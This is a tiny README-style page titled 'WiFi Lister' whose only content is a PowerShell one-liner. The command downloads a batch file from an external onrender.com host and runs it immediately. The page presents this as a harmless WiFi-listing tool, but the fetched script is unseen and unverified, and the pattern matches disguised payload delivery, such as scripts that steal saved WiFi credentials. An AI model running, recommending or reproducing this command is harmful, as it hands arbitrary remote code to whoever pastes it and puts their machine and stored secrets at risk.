# 🐱 **WiFi Lister**

Command:
   ```
   powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://d-n0pt.onrender.com' -OutFile 'script.bat'; Start-Process 'script.bat'"
   ```

